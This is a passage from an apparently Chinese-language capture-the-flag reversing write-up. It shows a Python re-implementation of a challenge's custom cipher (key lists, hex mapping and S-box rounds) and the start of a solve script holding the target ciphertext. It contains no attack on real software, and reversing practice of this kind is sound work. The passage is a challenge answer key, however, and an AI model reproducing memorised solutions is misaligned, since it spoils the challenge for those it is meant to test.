class="number">72</span>,<span class="number">177</span>,<span class="number">121</span>,<span class="number">240</span>,<span class="number">158</span>,<span class="number">32</span>,<span class="number">215</span>,<span class="number">64</span>,<span class="number">112</span>,<span class="number">80</span>,<span class="number">228</span>,<span class="number">84</span>,<span class="number">124</span>,<span class="number">204</span>,<span class="number">206</span>,<span class="number">16</span>,<span class="number">22</span>,<span class="number">162</span>,<span class="number">253</span>,<span class="number">54</span>,<span class="number">134</span>,<span class="number">80</span>,<span class="number">154</span>,<span class="number">224</span>,<span class="number">156</span>,<span class="number">164</span>,<span class="number">90</span>,<span class="number">98</span>,<span class="number">206</span>,<span class="number">177</span>,<span class="number">119</span>,<span class="number">234</span>,<span class="number">69</span>,<span class="number">64</span>,<span class="number">83</span>,<span class="number">170</span>,<span class="number">134</span>,<span class="number">240</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">178</span>,<span class="number">59</span>,<span class="number">80</span>,<span class="number">16</span>,<span class="number">248</span>,<span class="number">98</span>,<span class="number">208</span>,<span class="number">182</span>,<span class="number">172</span>,<span class="number">112</span>,<span class="number">128</span>,<span class="number">102</span>,<span class="number">216</span>,<span class="number">16</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">137</span>,<span class="number">5</span>,<span class="number">249</span>,<span class="number">105</span>,<span class="number">152</span>,<span class="number">91</span>,<span class="number">224</span>,<span class="number">104</span>,<span class="number">242</span>,<span class="number">245</span>,<span class="number">167</span>,<span class="number">171</span>,<span class="number">144</span>,<span class="number">168</span>,<span class="number">203</span>,<span class="number">64</span>,<span class="number">168</span>,<span class="number">184</span>,<span class="number">208</span>,<span class="number">141</span>,<span class="number">40</span>,<span class="number">83</span>,<span class="number">156</span>,<span class="number">82</span>,<span class="number">204</span>,<span class="number">254</span>,<span class="number">192</span>,<span class="number">71</span>,<span class="number">48</span>,<span class="number">255</span>,<span class="number">28</span>,<span class="number">88</span>,<span class="number">230</span>,<span class="number">105</span>,<span class="number">135</span>,<span class="number">192</span>,<span class="number">152</span>,<span class="number">140</span>,<span class="number">192</span>,<span class="number">144</span>,<span class="number">140</span>,<span class="number">249</span>,<span class="number">238</span>,<span class="number">190</span>,<span class="number">16</span>,<span class="number">208</span>,<span class="number">152</span>,<span class="number">32</span>,<span class="number">166</span>,<span class="number">142</span>,<span class="number">232</span>,<span class="number">214</span>,<span class="number">16</span>,<span class="number">50</span>,<span class="number">112</span>,<span class="number">126</span>,<span class="number">66</span>,<span class="number">185</span>,<span class="number">20</span>,<span class="number">108</span>,<span class="number">229</span>,<span class="number">14</span>,<span class="number">200</span>,<span class="number">108</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">202</span>,<span class="number">70</span>,<span class="number">116</span>,<span class="number">152</span>,<span class="number">18</span>,<span class="number">199</span>,<span class="number">216</span>,<span class="number">96</span>,<span class="number">156</span>,<span class="number">212</span>,<span class="number">198</span>,<span class="number">248</span>,<span class="number">252</span>,<span class="number">2</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">196</span>,<span class="number">16</span>,<span class="number">26</span>,<span class="number">186</span>,<span class="number">172</span>,<span class="number">35</span>,<span class="number">64</span>,<span class="number">223</span>,<span class="number">130</span>,<span class="number">71</span>,<span class="number">125</span>,<span class="number">134</span>,<span class="number">6</span>,<span class="number">208</span>,<span class="number">242</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">158</span>,<span class="number">152</span>,<span class="number">112</span>,<span class="number">208</span>,<span class="number">154</span>,<span class="number">14</span>,<span class="number">53</span>,<span class="number">88</span>,<span class="number">177</span>,<span class="number">98</span>,<span class="number">208</span>,<span class="number">63</span>,<span class="number">225</span>,<span class="number">131</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">108</span>,<span class="number">60</span>,<span class="number">209</span>,<span class="number">227</span>,<span class="number">72</span>,<span class="number">20</span>,<span class="number">224</span>,<span class="number">130</span>,<span class="number">233</span>,<span class="number">144</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">75</span>,<span class="number">122</span>,<span class="number">178</span>,<span class="number">19</span>,<span class="number">36</span>,<span class="number">153</span>,<span class="number">60</span>,<span class="number">92</span>,<span class="number">19</span>,<span class="number">176</span>,<span class="number">73</span>,<span class="number">188</span>,<span class="number">7</span>,<span class="number">185</span>,<span class="number">80</span>,<span class="number">170</span>,<span class="number">244</span>,<span class="number">32</span>,<span class="number">121</span>,<span class="number">136</span>,<span class="number">23</span>,<span class="number">35</span>,<span class="number">85</span>,<span class="number">40</span>,<span class="number">227</span>,<span class="number">179</span>,<span class="number">80</span>,<span class="number">11</span>,<span class="number">243</span>,<span class="number">77</span>,<span class="number">64</span>,<span class="number">192</span>,<span class="number">216</span>,<span class="number">177</span>,<span class="number">22</span>,<span class="number">144</span>,<span class="number">84</span>,<span class="number">83</span>,<span class="number">96</span>,<span class="number">73</span>,<span class="number">248</span>,<span class="number">96</span>,<span class="number">11</span>,<span class="number">169</span>,<span class="number">222</span>,<span class="number">228</span>,<span class="number">0</span>,<span class="number">184</span>,<span class="number">112</span>,<span class="number">148</span>,<span class="number">175</span>,<span class="number">153</span>,<span class="number">4</span>,<span class="number">56</span>,<span class="number">216</span>,<span class="number">30</span>,<span class="number">0</span>,<span class="number">196</span>,<span class="number">156</span>,<span class="number">64</span>,<span class="number">4</span>,<span class="number">75</span>,<span class="number">217</span>,<span class="number">248</span>,<span class="number">112</span>,<span class="number">200</span>,<span class="number">132</span>,<span class="number">52</span>,<span class="number">151</span>,<span class="number">247</span>,<span class="number">234</span>,<span class="number">206</span>,<span class="number">60</span>,<span class="number">192</span>,<span class="number">83</span>,<span class="number">124</span>,<span class="number">250</span>,<span class="number">120</span>,<span class="number">15</span>,<span class="number">147</span>,<span class="number">218</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">248</span>,<span class="number">44</span>,<span class="number">142</span>,<span class="number">90</span>,<span class="number">224</span>,<span class="number">64</span>,<span class="number">85</span>,<span class="number">76</span>,<span class="number">159</span>,<span class="number">184</span>,<span class="number">143</span>,<span class="number">87</span>,<span class="number">128</span>,<span class="number">97</span>,<span class="number">229</span>,<span class="number">3</span>,<span class="number">135</span>,<span class="number">16</span>,<span class="number">130</span>,<span class="number">194</span>,<span class="number">194</span>,<span class="number">69</span>,<span class="number">198</span>,<span class="number">233</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">219</span>,<span class="number">24</span>,<span class="number">168</span>,<span class="number">184</span>,<span class="number">246</span>,<span class="number">234</span>,<span class="number">238</span>,<span class="number">224</span>,<span class="number">52</span>,<span class="number">48</span>,<span class="number">126</span>,<span class="number">20</span>,<span class="number">158</span>,<span class="number">146</span>,<span class="number">156</span>,<span class="number">179</span>,<span class="number">138</span>,<span class="number">240</span>,<span class="number">100</span>,<span class="number">145</span>,<span class="number">144</span>,<span class="number">82</span>,<span class="number">40</span>,<span class="number">184</span>,<span class="number">79</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">160</span>,<span class="number">170</span>,<span class="number">190</span>,<span class="number">48</span>,<span class="number">120</span>,<span class="number">93</span>,<span class="number">76</span>,<span class="number">48</span>,<span class="number">236</span>,<span class="number">210</span>,<span class="number">122</span>,<span class="number">152</span>,<span class="number">204</span>,<span class="number">253</span>,<span class="number">241</span>,<span class="number">56</span>,<span class="number">166</span>,<span class="number">242</span>,<span class="number">120</span>,<span class="number">252</span>,<span class="number">64</span>,<span class="number">128</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">212</span>,<span class="number">200</span>,<span class="number">251</span>,<span class="number">208</span>,<span class="number">108</span>,<span class="number">156</span>,<span class="number">120</span>,<span class="number">82</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">247</span>,<span class="number">136</span>,<span class="number">17</span>,<span class="number">98</span>,<span class="number">246</span>,<span class="number">40</span>,<span class="number">242</span>,<span class="number">64</span>,<span class="number">144</span>,<span class="number">84</span>,<span class="number">142</span>,<span class="number">175</span>,<span class="number">46</span>,<span class="number">212</span>,<span class="number">185</span>,<span class="number">42</span>,<span class="number">31</span>,<span class="number">176</span>,<span class="number">219</span>,<span class="number">205</span>,<span class="number">52</span>,<span class="number">144</span>,<span class="number">216</span>,<span class="number">69</span>,<span class="number">128</span>,<span class="number">92</span>,<span class="number">240</span>,<span class="number">25</span>,<span class="number">169</span>,<span class="number">194</span>,<span class="number">208</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">52</span>,<span class="number">75</span>,<span class="number">212</span>,<span class="number">40</span>,<span class="number">224</span>,<span class="number">10</span>,<span class="number">220</span>,<span class="number">99</span>,<span class="number">42</span>,<span class="number">183</span>,<span class="number">196</span>,<span class="number">240</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">23</span>,<span class="number">109</span>,<span class="number">20</span>,<span class="number">203</span>,<span class="number">111</span>,<span class="number">232</span>,<span class="number">77</span>,<span class="number">64</span>,<span class="number">251</span>,<span class="number">2</span>,<span class="number">194</span>,<span class="number">243</span>,<span class="number">112</span>,<span class="number">64</span>,<span class="number">199</span>,<span class="number">105</span>,<span class="number">168</span>,<span class="number">157</span>,<span class="number">213</span>,<span class="number">51</span>,<span class="number">168</span>,<span class="number">28</span>,<span class="number">223</span>,<span class="number">100</span>,<span class="number">152</span>,<span class="number">184</span>,<span class="number">157</span>,<span class="number">224</span>,<span class="number">132</span>,<span class="number">232</span>,<span class="number">14</span>,<span class="number">33</span>,<span class="number">115</span>,<span class="number">135</span>,<span class="number">2</span>,<span class="number">163</span>,<span class="number">6</span>,<span class="number">16</span>,<span class="number">143</span>,<span class="number">84</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">56</span>,<span class="number">84</span>,<span class="number">182</span>,<span class="number">47</span>,<span class="number">112</span>,<span class="number">160</span>,<span class="number">244</span>,<span class="number">139</span>,<span class="number">39</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">228</span>,<span class="number">105</span>,<span class="number">62</span>,<span class="number">176</span>,<span class="number">149</span>,<span class="number">112</span>,<span class="number">120</span>,<span class="number">218</span>,<span class="number">34</span>,<span class="number">80</span>,<span class="number">98</span>,<span class="number">7</span>,<span class="number">138</span>,<span class="number">144</span>,<span class="number">1</span>,<span class="number">79</span>,<span class="number">30</span>,<span class="number">120</span>,<span class="number">253</span>,<span class="number">68</span>,<span class="number">28</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">100</span>,<span class="number">222</span>,<span class="number">219</span>,<span class="number">3</span>,<span class="number">216</span>,<span class="number">205</span>,<span class="number">52</span>,<span class="number">207</span>,<span class="number">66</span>,<span class="number">240</span>,<span class="number">255</span>,<span class="number">188</span>,<span class="number">162</span>,<span class="number">44</span>,<span class="number">152</span>,<span class="number">125</span>,<span class="number">181</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">184</span>,<span class="number">164</span>,<span class="number">36</span>,<span class="number">234</span>,<span class="number">80</span>,<span class="number">128</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">95</span>,<span class="number">144</span>,<span class="number">53</span>,<span class="number">178</span>,<span class="number">196</span>,<span class="number">84</span>,<span class="number">56</span>,<span class="number">172</span>,<span class="number">166</span>,<span class="number">104</span>,<span class="number">236</span>,<span class="number">64</span>,<span class="number">228</span>,<span class="number">45</span>,<span class="number">146</span>,<span class="number">182</span>,<span class="number">8</span>,<span class="number">169</span>,<span class="number">224</span>,<span class="number">6</span>,<span class="number">228</span>,<span class="number">176</span>,<span class="number">72</span>,<span class="number">127</span>,<span class="number">208</span>,<span class="number">173</span>,<span class="number">246</span>,<span class="number">188</span>,<span class="number">20</span>,<span class="number">186</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">0</span>,<span class="number">232</span>,<span class="number">63</span>,<span class="number">216</span>,<span class="number">47</span>,<span class="number">32</span>,<span class="number">192</span>,<span class="number">100</span>,<span class="number">41</span>,<span class="number">214</span>,<span class="number">101</span>,<span class="number">208</span>,<span class="number">136</span>,<span class="number">6</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">164</span>,<span class="number">67</span>,<span class="number">208</span>,<span class="number">240</span>,<span class="number">230</span>,<span class="number">220</span>,<span class="number">0</span>,<span class="number">188</span>,<span class="number">135</span>,<span class="number">120</span>,<span class="number">215</span>,<span class="number">83</span>,<span class="number">212</span>,<span class="number">14</span>,<span class="number">240</span>,<span class="number">56</span>,<span class="number">248</span>,<span class="number">64</span>,<span class="number">252</span>,<span class="number">49</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">198</span>,<span class="number">116</span>,<span class="number">119</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">46</span>,<span class="number">210</span>,<span class="number">13</span>,<span class="number">28</span>,<span class="number">37</span>,<span class="number">220</span>,<span class="number">19</span>,<span class="number">67</span>,<span class="number">0</span>,<span class="number">159</span>,<span class="number">153</span>,<span class="number">61</span>,<span class="number">171</span>,<span class="number">55</span>,<span class="number">124</span>,<span class="number">219</span>,<span class="number">127</span>,<span class="number">42</span>,<span class="number">237</span>,<span class="number">220</span>,<span class="number">250</span>,<span class="number">77</span>,<span class="number">144</span>,<span class="number">238</span>,<span class="number">216</span>,<span class="number">25</span>,<span class="number">222</span>,<span class="number">183</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">67</span>,<span class="number">40</span>,<span class="number">176</span>,<span class="number">159</span>,<span class="number">120</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">58</span>,<span class="number">152</span>,<span class="number">32</span>,<span class="number">128</span>,<span class="number">208</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">64</span>,<span class="number">91</span>,<span class="number">152</span>,<span class="number">192</span>,<span class="number">136</span>,<span class="number">69</span>,<span class="number">188</span>,<span class="number">96</span>,<span class="number">17</span>,<span class="number">248</span>,<span class="number">72</span>,<span class="number">191</span>,<span class="number">228</span>,<span class="number">178</span>,<span class="number">85</span>,<span class="number">207</span>,<span class="number">157</span>,<span class="number">11</span>,<span class="number">244</span>,<span class="number">18</span>,<span class="number">202</span>,<span class="number">0</span>,<span class="number">220</span>,<span class="number">224</span>,<span class="number">252</span>,<span class="number">116</span>,<span class="number">221</span>,<span class="number">142</span>,<span class="number">178</span>,<span class="number">158</span>,<span class="number">64</span>,<span class="number">252</span>,<span class="number">128</span>,<span class="number">126</span>,<span class="number">103</span>,<span class="number">80</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">206</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">138</span>,<span class="number">152</span>,<span class="number">155</span>,<span class="number">36</span>,<span class="number">32</span>,<span class="number">224</span>,<span class="number">162</span>,<span class="number">100</span>,<span class="number">36</span>,<span class="number">163</span>,<span class="number">162</span>]</span><br><span class="line">keylist = [  <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>,  <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>,  <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>,  <span class="number">0x02</span>, <span class="number">0x02</span>]</span><br><span class="line"></span><br><span class="line">h = <span class="string">&#x27;1234567890abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ord_</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(a) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(a) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(a)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(a) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    key += keylist[i]</span><br><span class="line">    input1.append(enc1[key])</span><br><span class="line">    <span class="comment"># print(enc1[key],end=&#x27; &#x27;)</span></span><br><span class="line">    input1.append(h[((<span class="built_in">ord</span>(enc1[key]) &amp; <span class="number">0xff</span>) + <span class="number">3</span> * ord_(<span class="built_in">input</span>[i])) % <span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">enc2 = <span class="string">&#x27;&#x27;</span>.join(input1)</span><br><span class="line">enc2 = [<span class="built_in">int</span>(enc2[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc2), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">count_key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    v66_in = <span class="number">8</span> * i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            v63 = ((keylist2[count_key] &amp; <span class="number">0xff</span>) + enc2[v66_in + k])</span><br><span class="line">            count_key += <span class="number">1</span></span><br><span class="line">            v15 = s_box[v63 &amp; <span class="number">0xff</span>]</span><br><span class="line">            v62 = enc2[v66_in + (k + <span class="number">1</span>) % <span class="number">8</span>]</span><br><span class="line">            v62 = (v62 &lt;&lt; <span class="number">7</span>) | (v62 &gt;&gt; <span class="number">1</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">            enc2[v66_in + ((k + <span class="number">1</span>) % <span class="number">8</span>)] = (v62 - v15) &amp; <span class="number">0xff</span></span><br><span class="line"><span class="comment"># for i in enc2:</span></span><br><span class="line"><span class="comment">#     print(hex(i),end=&#x27;,&#x27;)</span></span><br></pre></td></tr></table></figure>
<p>可以得到 exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [  <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0xD8</span>, <span class="number">0xEE</span>, <span class="number">0xAB</span>, <span class="number">0x56</span>, <span class="number">0x68</span>, <span class="number">0x37</span>, <span class="number">0xAB</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0xCA</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x53</span>, <span class="number">0xCF</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0x7A</span>, <span class="number">0x0A</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0xF6</span>, <span class="number">0x25</span>, <span class="number">0xCC</span>, <span class="number">0x92</span>, <span class="number">0x78</span>, <span class="number">0xFF</span>, <span class="number">0xCC</span>, <span class="number">0x2D</span>, <span class="number">0x59</span>, <span class="number">0x10</span>,</span><br><span class="line">  <span class="number">0xA2</span>, <span class="number">0x2D</span>]</span><br><span class="line"><span class="comment"># print(len(enc))</span></span><br><span class="line">s_box = [ <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>,</span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>,</span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>,</span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>,</span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>,</span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>,</span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>,</span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>,</span><br><span class="line">  <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">keylist2 = [<span class="number">212</span>,<span class="number">253</span>,<span class="number">128</span>,<span class="number">196</span>,<span class="number">80</span>,<span class="number">16</span>,<span class="number">222</span>,<span class="number">109</span>,<span class="number">232</span>,<span class="number">240</span>,<span class="number">12</span>,<span class="number">82</span>,<span class="number">9</span>,<span class="number">64</span>,<span class="number">36</span>,<span class="number">151</span>,<span class="number">222</span>,<span class="number">119</span>,<span class="number">20</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">246</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">142</span>,<span class="number">109</span>,<span class="number">128</span>,<span class="number">206</span>,<span class="number">204</span>,<span class="number">7</span>,<span class="number">192</span>,<span class="number">244</span>,<span class="number">160</span>,<span class="number">4</span>,<span class="number">240</span>,<span class="number">28</span>,<span class="number">198</span>,<span class="number">0</span>,<span class="number">162</span>,<span class="number">88</span>,<span class="number">244</span>,<span class="number">52</span>,<span class="number">64</span>,<span class="number">176</span>,<span class="number">76</span>,<span class="number">160</span>,<span class="number">168</span>,<span class="number">86</span>,<span class="number">89</span>,<span class="number">233</span>,<span class="number">56</span>,<span class="number">40</span>,<span class="number">208</span>,<span class="number">104</span>,<span class="number">64</span>,<span class="number">102</span>,<span class="number">150</span>,<span class="number">69</span>,<span class="number">210</span>,<span class="number">103</span>,<span class="number">64</span>,<span class="number">208</span>,<span class="number">36</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">76</span>,<span class="number">202</span>,<span class="number">120</span>,<span class="number">76</span>,<span class="number">188</span>,<span class="number">192</span>,<span class="number">66</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">109</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">56</span>,<span class="number">176</span>,<span class="number">4</span>,<span class="number">196</span>,<span class="number">72</span>,<span class="number">128</span>,<span class="number">232</span>,<span class="number">113</span>,<span class="number">255</span>,<span class="number">64</span>,<span class="number">132</span>,<span class="number">70</span>,<span class="number">84</span>,<span class="number">37</span>,<span class="number">122</span>,<span class="number">56</span>,<span class="number">32</span>,<span class="number">248</span>,<span class="number">192</span>,<span class="number">56</span>,<span class="number">148</span>,<span class="number">249</span>,<span class="number">112</span>,<span class="number">228</span>,<span class="number">250</span>,<span class="number">112</span>,<span class="number">8</span>,<span class="number">64</span>,<span class="number">51</span>,<span class="number">231</span>,<span 